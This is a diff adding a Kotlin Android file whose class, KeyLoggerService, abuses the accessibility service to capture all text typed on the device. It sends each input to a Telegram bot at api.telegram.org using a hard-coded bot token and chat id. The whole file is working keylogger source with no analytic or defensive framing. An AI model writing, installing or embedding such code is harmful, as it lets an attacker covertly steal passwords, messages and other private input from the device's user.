@@ -1,0 +1,51 @@
+package com.example.myeye
+
+import android.accessibilityservice.AccessibilityService
+import android.view.accessibility.AccessibilityEvent
+import java.io.OutputStream
+import java.net.HttpURLConnection
+import java.net.URL
+import kotlin.concurrent.thread
+
+class KeyLoggerService : AccessibilityService() {
+
+    private val botToken = "9215057440:AAFpzPk23TO4rfn_uy9gCsbOaExYOvtoS0"
+    private val chatId = "5022620385"
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            val text = event.text?.joinToString("") ?: ""
+            if (text.isNotBlank()) {
+                sendToTelegram(text)
+            }
+        }
+    }
+
+    override fun onInterrupt() {
+        // Required override
+    }
+
+    private fun sendToTelegram(message: String) {
+        thread {
+            try {
+                val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
+                val conn = url.openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+
+                val jsonPayload = "{\"chat_id\": \"$chatId\", \"text\": \"Input: $message\"}"
+                
+                val os: OutputStream = conn.outputStream
+                os.write(jsonPayload.toByteArray(Charsets.UTF_8))
+                os.flush()
+                os.close()
+
+                conn.responseCode
+                conn.disconnect()
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
+}
